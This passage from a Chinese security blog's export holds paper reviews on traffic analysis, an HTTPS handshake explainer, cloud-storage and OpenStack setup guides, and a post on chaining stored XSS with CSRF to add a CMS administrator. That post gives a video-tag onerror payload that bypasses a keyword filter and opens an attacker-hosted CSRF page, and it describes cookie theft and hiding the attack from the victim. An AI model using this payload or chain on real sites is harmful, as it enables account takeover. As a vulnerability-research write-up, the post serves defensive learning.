优化相似流量检索方法作者提出的第二个思路是在对App进行识别时，在原主机名匹配技术的基础上加上key-value匹配技术。实验中的key-value大致如下： 因此在算法2中进行了修改，如果是HTTP流量，则需要检测key-value，如果匹配的话，计数+1： 在算法修改后的实验结果如下： 比起之前的实验，准确度已经从81%上升到了93%。 比较与限制最后就是常规的吹牛批环节，作者将自己的实验与AppScan进行比较，说明自己提出的方法很牛批，不但检测时间快，资源消耗少，而且精确度也差不多（作者提到自己的实验中准确率最高时能达到95%-96%，而Appscan只能达到94.7%）。 然后作者提出自己方法中的三个缺点：1.无法实时检测，需要一段时间2.后台app定时产生的一些加密流量无法识别，因为找不到关联流量3.没法识别新增的流量 WhiteRabbit评论： 这篇文章无论是结构还是思路都十分清晰，在实验部分的设计也不错，层层递进。这里还是提出一点不足和思考。 文章作者：WhiteRabbit来源：blog.whiterabbitxyj.com转载请标注原文和作者。","tags":[{"name":"学术","slug":"学术","permalink":"http://yoursite.com/tags/学术/"},{"name":"论文","slug":"论文","permalink":"http://yoursite.com/tags/论文/"}]},{"title":"七牛云临时域名过期后图片找回","date":"2018-12-13T03:39:32.000Z","path":"2018/12/13/qiniu/","text":"算算时间有一段时间没有更新博客了，一来是年底了事比较多，另一方面主要是我的博客出现了一点问题：博客上的图片无法显示了。后来排查了一下原因，发现原来是七牛网的临时域名过期了！这篇博文写给遇到同样问题的朋友们，提供一下找回图片的方法。 七牛网临时域名七牛网是我一位师姐在我刚开始做博客时推荐给我的，当时觉得挺方便就使用了，一直用了大半年都没有问题。直到七牛网分配给我的域名过期了，图片无法上传到七牛网后，我才知道这原来是个临时域名。虽然过期了，但之前上传的图片还是可以显示了，所以我一直也没有处理。直到最近，临时域名直接被回收了，我之前上传的图片也访问不了了，我才意识到不处理不行了。 我进入控制台的存储界面，直接给我报错： [5402] 获取 bucket 域名失败 这是因为临时域名被回收，所以存储的图片找不到路径，所以报错了。我在控制台前前后后找了半天没有找到任何下载我之前上传图片的功能，由于域名被回收，我也无法直接去访问下载。 一种解决方法是去绑定域名，但是绑定的域名需要备案，麻烦无比，所以我查了七牛网官方的API后，终于找回了我之前上传的图片。 图片找回qshellqshell是利用七牛文档上公开的API实现的一个方便开发者测试和使用七牛API服务的命令行工具。该工具设计和开发的主要目的就是帮助开发者快速解决问题。我们需要了解的是，我们之前上传的图片并没有丢失，它们一直存在bucket空间中，只是我们无法直接访问。而qshell这个工具能让我们直接访问bucket空间，从而获取我们之前上传的图片。这里贴一下工具的下载链接：qshell。 使用流程(1). 首先，在工具上绑定用户，输入命令行： qshell account ak sk name 其中，ak和sk是你个人的AccessKey和SecretKey，在你的个人中心中可以查看，而name可以随便写，只是做标记： (2). 然后，导出你的图片列表： qshell listbucket 原bucket名 -o list.txt 原bucket名是指你原来存储图片空间的名字，可以在存储空间中查看： (3). 使用Awk获取list结果的第一列： cat list.txt | awk &apos;{print $1}&apos; &gt;list_final.txt //如果windiws无法执行这条命令，安装一个cmder就可以执行了，或直接编辑txt 并在七牛网中新建一个空间做准备： (4). 然后，将原空间中图片做一个迁移： qshell batchcopy 原bucket名 新bucket名 -i list_final.txt 这样原来空间的图片都迁移到新空间了，由于新空间有临时域名，所以图片可以被访问了。 (5). 直接用qshell工具下载所有图片到本地。 qshell qdownload newfilelist.txt newfilelist.txt中是配置文件，可以参考一下我的配置信息进行修改： { &quot;dest_dir&quot; : &quot;D:/xxx/xxx/xxx/blogPicture/&quot;, &quot;bucket&quot; : &quot;blog&quot;, &quot;cdn_domain&quot; : &quot;pjo4oyz5p.bkt.clouddn.com&quot;, &quot;referer&quot; : &quot;http://www.example.com&quot; } 小彩蛋：配置不可访问列目录按照上面的方法，你的图片就可以全部找回了。但是思来想去，我还是得找一个地方去存储我的图片，于是乎咬了咬牙买了一台云服务器。 在配置云服务器时出了一点问题，我想要配置不可访问列目录，然而我找不到httpd.conf。在网上查了一下，原来云服务器的操作系统是ubuntu，而部署的web服务器是apache，所以没有httpd.conf，只有apache2.conf。 find / -name apache2.conf //查找apache2.conf位置 在其中添加配置： &lt;Directory &quot;/var/www/html/&quot;&gt; Options FollowSymLinks AllowOverride None Order allow,deny Allow from all &lt;/Directory&gt; 保存后重启apache服务器： /etc/init.d/apache2 restart 然后就配置完成啦：","tags":[{"name":"域名","slug":"域名","permalink":"http://yoursite.com/tags/域名/"},{"name":"云服务","slug":"云服务","permalink":"http://yoursite.com/tags/云服务/"}]},{"title":"从流量的角度详解HTTPS协议握手过程","date":"2018-11-19T03:39:32.000Z","path":"2018/11/19/https/","text":"由于最近在思考搭建一个属于自己的网站，为了安全性，决定仔细研究了一下HTTPS。看了很多资料，对其中的很多细节做了研究，再加上亲手抓包来做参考，终于算是对整个握手过程和保证有了认识，所以尝试用文字性的语句描述下来，以最通俗易懂且详尽的方式来让更多读者理解。所以即使你是完全不懂https的小白，也能通过我的文章对其有一定的学习收获。 握手在全篇文章开始，我们先理解一下什么是握手。我们思考一个场景，两个陌生人见面了，如何进行交谈呢？握手是很好的一个方法来使双方达成共识。一人伸出手来，表示我想和你交谈，另一个人握住他的手，表示我愿意与你交谈，双方从而达成共识，可以开始愉快地交谈了。我们将场景映射到计算机环境中，那个伸出手的人是客户端，而握住手的人就是服务器。双方进行握手，完成连接，随后开始传输数据。 但实际的场景可能会复杂很多，如果这两个陌生人要交谈的内容是机密性的，不希望被别人听到，那这个握手过程可能不仅仅只是握手，他们可能会商量好在哪交谈，用什么方式交谈等等，确保没有问题后才会握手达成共识。对于HTTPS来说，就是这个场景，为了安全性，其握手过程也会比普通的HTTP握手过程复杂。 整个HTTPS握手流程整个HTTPS的握手大概可以分为4个步骤： 客户端发起请求，向服务器端传递一个随机数p，以及客户端支持的加密算法 服务器接到请求，回复客户端使用哪套加密算法，并向客户端回传一个随机数q以及服务器证书（包含公钥） 客户端拿到服务器回传的信息，开始验证服务器证书，确定无误后，生成第三个随机数k，并使用公钥加密这个随机数并传递给服务器。 服务器拿到公钥加密后的随机数k，使用私钥解密，并使用已经拥有的3个随机数(p,q,k)生成最终的对称加密密钥，并告诉客户端其已经得到最终的对称加密密钥，可以开始通信了。 整个过程差不多就是这样，如果你对“对称加密”和“非对称加密”没有了解的话，可能理解其整个握手过程会很头疼，这里我只做简单的讲解： 对称加密：加密和解密都用同一个密钥。 非对称加密：拥有密钥对（公钥和私钥），一种密钥加密的密文必须用另一个密钥才能解密。 更详细内容可能需要小白们自己搜资料学习了，我们所需要知道的，HTTPS同时使用了这两种加密方式来完成通信，是因为直接使用非对称加密来加密信息的计算代价太大了，而对称加密却很快，所以HTTPS使用非对称加密的方法来传递对称加密的密钥（实际上只是生成密钥的信息），再使用对称加密来实现信息加密。 在流量角度来看整个握手过程为了展示整个握手过程的流量交互，我使用wireshark抓取了数据，但所捕捉的数据不够典型，所以我借用RAZEEN博客中的截图来进行讲解说明。 下面我会解释每一个数据包与其对应的过程。 Client Hello客户端开始向服务器发起访问请求，在这个过程中，客户端会生成一个随机数p，然后把随机数和一些信息一起打包发送给服务器。这里的信息包括：我支持的协议版本，可以使用的加密算法等等，您看看我们用哪个好？ 我们可以从流量的第一个Client Hello数据包看到这些携带的信息： Server Hello服务器端接收到了客户端的请求，回复已经收到请求，并告诉客户端我们使用什么版本的协议，以及使用什么样的加密算法来通信。在回复的内容中，还会包含一个服务器端产生的随机数q，用以后面生成密钥。 我们可以从第二个数据包Server Hello看到这些信息： 我们可以看到这个Cipher Suite的格式，其包含了一套加密算法，包括非对称的加密算法以及对称加密算法等等，可以参考一下下面的图: 之后，服务器端还会把自己的电子证书（Certificate）传递给客户端，用以让客户端验证自己的身份，证书中还包含了服务器的公钥，用以等会传递第三个随机数。完成这一步后，服务器会回复一个 “Server Hello Done” 来表明已经将所有预计的握手消息发送完毕。 Client Key Exchange客户端接收到了服务器端的证书，验证证书的有效性和签名，确定无误后，开始准备传递第三个随机数。这是很关键的一步，上面传递的2个随机数都是明文传递，是可以被攻击者获取的，接下来要传递的第三个随机数是绝密的。客户端使用服务器证书中的公钥加密这个随机数，并将其传递给服务器，由只有服务器拥有私钥，所以只有服务器可以拿到这个随机数。 这完成随机数传输后，客户端发送一个 “Change Cipher Spec” 来告诉服务器我已经生成加密密钥了，而且生成加密密钥的第三个随机数也已经发送给你了，接下来我们将切换到加密通信模式。 Finished服务器接收到经过公钥加密的第三个随机数，然后用私钥解密他得到随机数k，再使用随机数p,q,k来生成最终的加密密钥，因为随机数相同，所以客户端和服务器端现在手里的密钥是相同的，所以可以进行通信。这个时候，服务器会回复一个 “Change Cipher Spec”，目的和客户端发送的一样，表示接下来的通信使用加密的方式。可以看到，在上一个数据包中，客户端会给服务器发送一个 “Encrypted Handshake Message” ,而服务器也会在最后回复一个Encrypted Handshake Message，这是由客户端服务器之间协商的算法和密钥保护的第一个消息，它意味着握手已经完成。 密钥通过整个流程我们可以分析出，服务器和客户端的加密通信基础在于双方拥有相同的对称加密密钥。但是直接传递对称加密密钥是不可行的，一旦被攻击者截获，那通信将无秘密可言。所以怎么安全地传递对称密钥是一个问题，HTTPS采取的方法是使用非对称加密体制来传递密钥信息，事实上Client Hello和Server Hello都是在为非对称加密做准备。 HTPPS的设计是客户端和服务器端各生成一个随机数，并在前两次通信中进行传递，这两个随机数是可以被截获的，但无伤大雅。在前两次通信中，客户端和服务器端出来传递随机数，也商量好了使用哪种非对称算法来进行第三个随机数传输，并且已经完成了公钥的传递。第三个随机数由客户端生成，并将随机数使用公钥加密后传递给服务器。这个过程可能被截获，但是由于没有私钥，攻击者依旧无法得到第三个随机数，只有服务器可以得到。至此，客户端和服务器端都拥有了这三个随机数，所以能够生成相同的对称密钥。 我们思考个问题，为什么是3个随机数？我们知道现在的随机数都算是伪随机数，无法保证真正的随机性，但是3个伪随机数生成的新数在一定意义上能保证随机性，达到随机的安全标准。随机数的意义在于抵抗重放攻击，当然客户端和服务器各自生成随机数也能防止一方产生的随机数可能出现的问题。 DH握手上面我们一直在以RSA握手形式来描述整个握手流程，因为RSA握手是最经典而常规的HTTPS实现方式，方便小白理解。实际上，HTTPS一共有两种方式来握手。在实际的抓包观察中，我发现大部分的网站HTTPS都是采用DH握手的。 说起来DH算法真的是一个很神奇的算法，原理上它是非对称加密的基础，这里不对算法进行分析描述，有兴趣的可以参考：DH算法原理。本博文只讲述一下DH握手与RSA握手有什么不同。 整个HTTPS的握手大概可以分为4个步骤： 客户端发起请求，向服务器端传递一个随机数p，以及客户端支持的加密算法 服务器接到请求，回复客户端使用哪套加密算法，并向客户端回传一个随机数q以及服务器证书（包含公钥） 服务器先发起DH参数交换请求，使用自己的私钥签名DH参数后发送给客户端。客户端验证服务器证书，确定无误后将自己的DH参数发送给服务器。 服务器拿到客户端的DH参数后计算出第三个随机数k，并使用已经拥有的3个随机数(p,q,k)生成最终的对称加密密钥，并告诉客户端其已经得到最终的对称加密密钥，可以开始通信了。 我们可以看到，其实RSA握手和DH握手的差异只在于第三个随机数的传递方式，RSA握手使用非对称加密的公钥加密方式来传递第三个随机数，而DH握手使用服务器端和客户端相互交换DH参数的方式来传递第三个随机数。 在流程上，在 Server Hello 后，服务器会将DH参数用私钥加密传递给客户端。客户端用公钥解密DH参数，从而验证这条信息来自于服务器，而后将自己的DH参数传递给服务器。DH算法的巧妙在于，客户端和服务器端都有一个属于自己的信息，他们将自己的信息和另一个信息结合后公布出来，而他们再将对方公布的信息和自己的信息结合，就能生成一样的密钥。所以，从始到终，客户端和服务器端都不知道对方的私密信息是什么，但这不重要，只要他们拿到对方的公开信息和自己的私密信息，就能生成一样的密钥。因此攻击者只知道公开信息，完全没有任何作用，根本无从下手。 因此DH握手和RSA握手的差别只在于如何交换对称密钥信息，但他们的最终目的还是生成一个双方共享的对称密钥。 我们看看在流程数据包中的具体DH握手： 可以和RSA握手的图进行比较，多了一个Server Key Exchange，也就是服务器端发出的信息多了一次（因为DH参数是客户端和服务器端相互交换，比起客户端直接加密随机数返回自然多了一步。 Client Hello这一步的过程和RSA握手基本上没有差别，依旧是客户端开始发起请求，可以看一看流量数据包截图： Server Hello第二部初始的Server Hello和RSA握手也没有什么差别： 这时服务器会和RSA握手一样将自己的证书发送给客户端。不同的是，此时RSA握手已经发送Server Hello Done表示Server Hello结束，而DH握手还会将自己经过计算的DH参数传递给客户端（Server Key Exchange），最后发送一个Server Hello Done 来表示发送的信息已经完成。 Client Key Exchange收到了服务器端发送的证书和DH参数后，客户端会先验证服务器证书，确定无误后，使用服务器的DH参数来计算自己的DH参数，然后将其发送给服务器。剩下来的过程就一样了，发送Change Cipher Spec来表示自己已经生成加密对称密钥了，接下来的通信将切换到加密方式，发送发送第一个加密信息。 Finish这一步也是一样的，服务器回复Change Cipher Spec和Encrypted Handshake Message，随后加密通信数据传输开始。 证书验证HTTPS证书的验证是我的一个兴趣点，所以我深入进行了研究与观察。我们首先需要知道，证书是用来验证服务器身份的。我们联系到我们实际的生活场景，假如我们完成了某次国家编程等级考试，那么我们会得到一张证书。 在某次工作应聘的过程中，对方要求我们提供编程等级证书，于是我们提供这张证书。但是对方招人是很严格的，他们会对这张证书进行审查。 首先，他们需要确保获得这张编程等级证书的人的确是我。所以这个证书上获得人的名字必须是我的名字（可以映射到电子证书上的域名）。确定了这张证书的获得人的确是我，接下来他们需要验证这张证书是否有效，所以他们会去查这个证书颁发机构是否权威。这个过程是通过验证签名，如果是阿猫阿狗颁发的（非权威机构签名和自签名证书），那他们会去问老板（实际用户）这个要不要收。如果是权威机构颁发的，那他们就确定了这张证书有效，收了。 在实际的客户端和服务器通信中，服务器将证书传递给客户端，证书中包含了公钥。客户端拿到证书，先会去验证证书是否在时效内，域名信息什么的是否正确等等。然后去看签名，看看是哪个机构做的签名，验证签名的方式就是拿这个机构的公钥去解密签名，如果能解那就的确是这个机构签的，所以这里也有一个非对称加密的应用。当然，很可能给证书签名的机构并不是CA机构，我们去得到他公钥的方式也是获取他的证书，那么我又要去验证他证书上的签名。所以这就会变成一个递归问题，我们需要不断验证上一个证书的签名，直到最终那个我们信任的证书就在我们本地，这个证书我们称为根证书，比如CA权威证书。而这一连串需要验证的证书，我们又称之为证书链。直到客户端确定了这个证书有效，那么就会进行下一步。 所以我们可以随之想到，当我们使用自签名证书时，客户端能验证这个签名是我们签的，但我们并不是权威机构，所以会生成一个警告并提醒用户。 结束关于https的握手基本上到这里就差不多了，最后分享一个给自己网站配置https的官方应用：Let’s Encrypt，这个网址应用可以免费申请电子证书以及自动配置https，其建立就是为了推广https，所以大家可以去试试，自己搭个网站研究研究，可以更好地理解https。","tags":[{"name":"流量","slug":"流量","permalink":"http://yoursite.com/tags/流量/"},{"name":"https","slug":"https","permalink":"http://yoursite.com/tags/https/"}]},{"title":"通过网络流量识别感染用户","date":"2018-11-12T03:39:32.000Z","path":"2018/11/12/xueshu-2/","text":"论文：Identifying infected users via network traffic作者：Margaret Gratian a , Darshan Bhansali a , Michel Cukier a , Josiah Dykstra b期刊：computers &amp; security时间：2018来源：SCI 介绍网络流量识别现状 利用网络流量来识别感染个体在研究与开发中都得到了广泛应用 大多数方法是基于IP地址，二进制以及硬件设备 许多实际网络流量识别的准确率已经能超过99% 如何去通过网络流量来分析用户个体以及用户行为已经成为热门 作者的思路 提供一个映射表，能将每条流量与用户关联起来 通过流量特征来识别用户是否为感染用户 文章涉及到的方法 主成分分析 无监督学习聚类 有监督学习建模 背景和相关工作这一章节作者总结分析了前人的研究工作，这里不做重复阐述，而在相关工作方面作者提出了两大问题： 问题一能否从网络流量中提取出能够最好地解释用户行为差异的特征？ 以前的研究的特征能够做到区分恶意和良性的主机或IP地址，作者希望找到特征能够做到区分感染与非感染用户。 问题二对感染与非感染用户的识别度有多高？ 作者选择用无监督学习与有监督学习一起评估。无监督学习评估方法：每个簇的纯度。有监督学习评估方法：ROC曲线，AUC值，漏报率以及误报率。 数据这一节讲解了如何获取数据集，数据的提纯以及处理。 数据集数据来源： 1.数据由学校信息安全IT部门提供，从2017年10月26日——11月21日中随机抽取样本。 2.question：为什么要使用无线流量作为研究对象？在大学里，65%的流量都是无线流量，基数大。 3.流量由老师，学生，职工，以及闲杂人等产生，每个要使用网络的人都需要认证，认证方法就是使用个人唯一标识ID，这个标识会被系统记录并附加到每一条流量记录上。 4.在使用这个数据集前，作者提了一下用户隐私保护问题，每个ID在给予他们做实验前都转换成了hash，这样就保证了匿名性。数据集一共包括了66,551,686条无线流量记录以及14,621条威胁记录。 流量记录：一个完整的对话流才会产生记录，每条流量记录拥有54个字段，包含了源用户ID，会话开始时间，源IP和目的IP，发送和接收的字节数，发送和接收的数据包数会话长度等等。 威胁记录：被系统检测到无线会话过程中出现的恶意威胁。因此每条威胁记录可以匹配到流量记录中的某几条数据。威胁记录包含了协议、威胁时间、威胁类型，威胁程度等等。数据集中只包含中等威胁及以上的数据。 数据验证与处理作者提到，使用Python的Pandas库和Numpy库来进行这一步。 1.确定实际人数。在无线流量记录中，一共提取出53,165个用户；在威胁记录中，一共提取出1935个用户。进行一一关联时，作者发现者1935个用户中有12个用户从未出现在无线流量记录中。这12个用户属于异常数据，作者猜测是因为会话在一开始就被定义为威胁，然后被记录，然而还未产生完整的会话流就直接终止，所以并没有任何流量记录。所以最后作者去除这12个用户产生的威胁记录，只保留了1923个威胁用户。 2.关联流量记录和威胁记录。关联方法为先用用户ID来筛选流量记录，再用时间来确定。 3.调整数据集。原数据中一共有1923个感染用户和51,242个非感染用户，由于这个比例差距比较大，所以作者考虑缩小非感染用户样本数量来调节。作者一共设置了6个分组。其中3个分组感染用户和非感染用户的比例为1:1，另外3个分组中感染用户和非感染用户的比例为3:7。 特征筛选字段在上面提到，每条流量记录一共有54个字段，这些字段很明显不是每一条都有用的。所以作者经过了筛选，删除条件包括：有缺失值，总是记录相同值，信息量小。最后作者只保留了10个字段：Start Time, Elapsed Time, Source IP, Source Port, Destination IP, Destination Port, Bytes Sent, Bytes Received, Packets Sent, and Packets Received。 生成特征这里作者做了2步工作，第一步将上面筛选出的10个字段数字化，第二步，从这10个字段中提取出36个特征。作者表示这些特征覆盖了多个方面（比如频率，数量，时间）。具体特征为下表： 主成分分析作者使用主成分分析方法来降维，绘制了Screen plots图来对主成分的数量进行选择，最后将36个特征转换成了13个主成分（数目到达13开始平稳）。对于两类比例分组，方差解释率（评估主成分的原特征的转换成功率）在1:1的3个分组分别达到了90.01%,90.22%,98.09%，在3:7的3个分组分别达到了90.27%,90.39%,97.71%。 而原始36个特征对方差解释率的贡献如下： 分析：1.先分析比例为1:1的数据集分组，平均方差解释率为92.77%，而有5个特征拥有最高的方差贡献：average session length, average number of bytes sent, num- ber of unique destination ports, number of unique source IP addresses, and average time difference between session start times。 2.作者然后用 “相关值（correlation value）” 来评价主成分和原特征之间的关系，并以此来增强对特征解释用户差异的理解。根据描述，当相关值阈值设置为0.4时，有17个特征满足条件；阈值设置为0.5时，有10个特征满足条件；阈值设置为0.6时，只剩6个；为0.7时为2个而0.8为1个。 3.作者主要观察了阈值为0.5时的十个特征，发现最高的5个特征就是那5个方差贡献值最高的5个特征。 4.作者接着分析了3:7的分组，过程和结果基本和1:1相同，这里不做复述。 5.作者在这里对之前提出的问题一做出解答，认为阈值为0.5时这10个特征能够做出解释。 无监督聚类在无监督聚类这一步，作者选择的是K-mean方法，且作用对象为全部1:1和3:7的6个样本，特征选用全部36个特征以及13个主成分。经过测试，作者选择了K-mean方法的参数K=4。作者的思想是这样的，由于做的无监督学习，算法是不知道标签的，只会根据数据的相似性来聚类，作者可以根据最终的聚类结果观察感染用户和非感染用户的聚集性。最终的实验结果如下： 分析一下上面的结果，对于36个特征以及比例1:1的聚类，一共出现了3个独自成群的情况，作者将其视为潜在的离群值。不管这些值，群的纯度范围从70.51%到89.09%。而对于36个特征以及比例3:7的聚类，依旧出现了3个离群实例，而群的纯度也显得更高。但是3:7的聚类出现了平分群的情况，即纯度接近50%。 分析一下上面的结果，对于13个主成分以及比例1:1的聚类，一共出现了3离群实例以及1个平分群的情况。除去这些，群的纯度范围从64.93%到94.12%。而对于13个主成分以及比例3:7的聚类，出现了2个离群实例和一个平分群情况，而群的纯度范围为60.07%到100%。 作者表示，虽然不知道算法究竟是怎么运转和做决定的，但其关注点在于不清楚具体标签的情况下，只根据特征和数据关联来聚类，最后的结果能否显示网络流量中存在用户感染状态的“信号”。作者认为无论是36个特征还是13个主成分都表现出了这种“信号”，因此有做长期研究的必要。但是由于也存在了平分群的情况，所以也要研究出现的原因。 有监督的学习和无监督聚类一样，在有监督学习这一块作者对2种比例的6个样本，36个原特征以及13种主成分都进行了实验，并将测试集和训练集以2:8和3:7的比例进行划分。 根据作者描述，其一共使用了8种机器学习算法来进行实验比较：K-Nearest Neighbors (scikit-learn developers 2017 b), Logistic Regression (scikit-learn develop- ers 2017 c), Random Forest (scikit-learn developers 2017 d), Ad- aBoost (scikit-learn developers 2017 e), Gradient Boost (scikit- learn developers 2017 f), Extra Tree (scikit-learn developers 2017 g), Bagging scikit-learn developers 2017 h), Voting (Ma- jority Rule) (scikit-learn developers 2017 i).作者使用调整参数和十折交叉验证的方式来把每个算法调整至最佳，并防止其出现过拟合。除了上诉这8种算法，作者还使用了神经网络算法进行实验，双层的记为Neural Network 1，四层的记为Neural Net- work 2。作者使用4个指标来综合评估模型的好坏：Accuracy（精确度）, ROC AUC, false positive rate（误报率）, false negative rate（漏报率）。具体结果如下图： 由于空间问题，作者只在每一项展示了最优秀的几个分类器，可以看到上图1:1比例中Accuracy的范围在71.0%——79.0%，ROC AUCs的范围在81.0%——86.0%，false positive rate的范围在17.2%——21.5%，而false negative rate的范围在21.2%——41.3%。 上图3:7的样本分类比例中，Accuracy的范围在77.0%——78.5%，ROC AUCs的范围在80.9%——85.3%，false positive rate的范围在16.8%——22.0%，而false negative rate的范围在21.7%——36.0%。 作者表示，上图的显示结果是将4种评估方法视为同等重要性而产生的，但在实际环境中并不是这样，可能有些系统的误报率需求远重要于漏报率等等。在实验中并没有找到哪个分类器4个指标都优于其他分类器的情况，所以只能找出单个指标最优的，比如在1:1的分类比例中：79.0% accuracy by Neural Network 2; 86.0% ROC AUC by Gradient Boost; 17.2% FPR by Extra Tree; and 21.2% FNR by Neural Network 2。而对于3:7的比例分类：78.5% accuracy by Gradient Boost; 85.3% ROC AUC by Gradient Boost; 16.8% FPR by Extra Tree; and 21.7% FNR by Gradient Boost。 缺陷作者在文末提到了自己研究的几个缺陷 1.选择完全相信系统的威胁记录，并不清楚系统的误报率和漏报率。 2.对“感染用户”的定义。作者选择将威胁等级中等以上视作感染用户，在全部的的感染用户中，中等威胁的用户有1858个，高威胁的用户只有41个，而严重威胁的用户优质11个。所以只考虑高威胁和严重威胁的用户为“感染用户”，那么实验结果可能更加合理，但是样本实在太小了。 3.无法保证流量记录的完整性。 WhiteRabbit评论： 文章做足了实验，但是整个文章读下来感觉到最大的问题在于作者对于自己每一个实验的结果似乎只是在做描述，并没有进行分析或者有层次感地深入。这就导致了我们看到了实验结果，但不知道这个实验结果到底意味着什么，又有什么意义，对我们又有什么启发。 文章作者：WhiteRabbit 来源：blog.whiterabbitxyj.com 转载请标注原文和作者。","tags":[{"name":"学术","slug":"学术","permalink":"http://yoursite.com/tags/学术/"},{"name":"论文","slug":"论文","permalink":"http://yoursite.com/tags/论文/"}]},{"title":"当xss邂逅csrf：中招只在一瞬间","date":"2018-11-01T03:39:32.000Z","path":"2018/11/01/xsrf/","text":"这篇博文来自之前挖掘一套CMS漏洞时，同时挖出了xss和csrf漏洞。不过我提交漏洞后，xss漏洞被接受了，而csrf漏洞被退回了，理由是：利用难度太大，不予收录。可以想象当时我的心情是十分不爽的，所以我绞尽脑汁，将xss和csrf配合使用，向某机构证明是可以利用的，而且很方便。最后漏洞被收录吗？嘿嘿，你们自己猜吧，不过这次经历说明了当xss配合csrf打出组合拳时，会有意想不到的效果。 寻找XSS漏洞拿到CMS，第一件事先去看它有没有留言功能，因为留言功能一般是会传到后台给管理员看的，所以如果有留言功能就可能存在XSS漏洞。我很快找到这套CMS的留言框，迫不及待地打了一个XSS尝试： 请求直接被拦截了，很明显是有过滤机制的，去查看了一下他们的防护措施： 在上面我用红框标注的是针对xss的过滤，正则匹配关键字：script，img，还有几个弹框函数。这里我想说一下，一些小白挖xss的洞，script一下失败，然后换成img一下也失败，然后就放弃了。其实可以插xss的标签远不止这两个，比如我用video标签来绕过这次xss过滤： 当管理员在后台查看留言时，就会触发xss代码，cookie被传到我的xss平台上： 寻找CSRF漏洞CSRF漏洞一般是由于没有检查Referer以及未在头部设置token造成的。CSRF的漏洞的寻找相对简单，我截获了请求包，发现没有token来对csrf攻击进行防护，于是尝试删除csrf中的Referer字段，发现并不影响功能，比如增加管理员。所以判断这套CMS是存在csrf漏洞的，于是在另一台服务器上构造了利用代码： 当管理员访问我服务器上的网页时，他就会中招：看到一个空白页面，但是本地网站后台增加了一个管理员。 XSS配合CSRF打出组合拳我们思考一个问题，存储型xss可以打到管理员的cookie，但是如果cookie保存时间很短，我们用的时候已经失效了，那也就没什么用了。再考虑一下csrf，实现csrf攻击有一个大前提，就是让管理员去访问你的服务器。一般来说，我们需要诱导管理员去访问你服务器上构造的csrf代码，比如留言诱导，客服诱导等等。但如果管理员就是不点击你的链接，不去访问你的服csrf代码，那你真是一点办法的没有。这也是为什么人家漏洞机构不收csrf漏洞的主要原因。我们思考为什么存储型xss漏洞的成功率比csrf高，因为xss代码是存储在数据库中，每次都会在后台自动调取，所以管理员一查看后台就中招了。查看自己网站的留言和访问外部服务器，很明显管理员更容易选择相信前者，所以相对而言存储型xss攻击的成功率更高。 接下来，我们将挖到的xss漏洞和csrf配合使用，吸取他们的优点，打出组合拳。首先，我们在留言处构造xss代码： &lt;video src=&quot;x&quot; onerror=javascript:window.open(&quot;http://localhost:8000/csrf.html&quot;)&gt;&lt;/video&gt; 这段js代码执行后，会直接在浏览器中打开一个新的窗口，且去访问我们制定的外部服务器上的csrf代码。 当管理员查看留言时，直接触发js代码，弹出一个新的窗口： 管理员可能会觉得莫名其妙，并关闭这个窗口，然而他并不知道我们已经借用他的权限执行了csrf代码，在他的后台增加了一个管理员账户： 当然，更好做的做法是构造js代码让这个新打开的窗口完成工作后自动关闭，这样管理员起疑心的可能性还会降低。 这样一来，我们成功利用xss+csrf在网站后台增加了一个管理员，弥补了xss攻击中cookie失效的问题，也弥补了csrf利用难度大的问题（难度相当于xss）。 总结这两个漏洞相对还是比较简单的，所以我拿出来作为讲解xss和csrf组合利用的案例，希望各位小白能从中学到知识。","tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/渗透/"},{"name":"xss","slug":"xss","permalink":"http://yoursite.com/tags/xss/"},{"name":"csrf","slug":"csrf","permalink":"http://yoursite.com/tags/csrf/"}]},{"title":"Openstack部署all-in-one初体验","date":"2018-10-25T03:39:32.000Z","path":"2018/10/25/dev-openstack/","text":"最近在学习openstack，因为人懒不想跟着官方文档一步步敲命令行部署，我最终是使用devstack来部署openstack的，由于脸黑，我用了2天时间才成功在虚拟机中部署成功。所以在这里分享一下怎么使用devstack来完成all-in-one的openstack部署。 准备虚拟机因为采用的all-in-one的部署方式，所以需要准备一台虚拟机作为openstack部署的主体，将所有的openstack服务都安装在一台虚拟机中。我使用的虚拟机软件是VMware，操作系统版本为Ubuntu 16.04。这里需要提一下，由于版本更新，devstack目前只支持Ubuntu 16，且openstack的pike、queens中很多默认库的版本与Ubuntu 14.04不匹配，在安装时会产生极大的麻烦（虽然16.04也很麻烦）。所以建议使用Ubuntu 16.04作为操作系统来安装虚拟机。 这里提供一下Ubuntu 16.04的ISO下载链接：link。 至于虚拟机的配置，这里建议8G内存+50G磁，实在不行也要保证4G以上的内存。 换sources.list源先安装一下vim： sudo apt install vim 编辑sources.list文件： sudo vim /etc/apt/sources.list 这一步很重要，openstack部署失败最大一部分原因就是资源在国外，下载时因为网络不稳定而出现time out，直接退出部署。我在这里提供一下我选择的源：source.list配置，也可以直接复制： deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial universe deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates universe deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security universe deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security multiverse 在修改完成后，更新一下源： sudo apt-get update 安装git因为devstack的项目是在公开github上的，所以我们安装git： sudo apt-get install git 安装pip并修改源因为devstack部署openstack时有很多需要使用pip下载的python库，所以我们先下载python-pip： apt-get install python-pip 我们选择把pip的源修改为国内的，这样安装的成功率会提升很多： mkdir ~/.pip &amp;&amp; vim ~/.pip/pip.conf 提供一下我的配置：pip源配置，也可以直接复制： [global] trusted-host=mirrors.aliyun.com index-url=http://mirrors.aliyun.com/pypi/simple 这里还有最后一步，就是更新一下pip的版本，以免pip的版本过低而下载不了devstack需要的python库： pip install --upgrade pip 下载devstack这一步我们下载从github上下载一个稳定的版本，毕竟不是做开发要求，还是尽量避过最新版，选择一个稳定的devstack版本即可： git clone https://git.openstack.org/openstack-dev/devstack cd devstack git checkout remotes/origin/stable/queens git checkout -b queens 或： git clone https://git.openstack.org/openstack-dev/devstack -b stable/queens 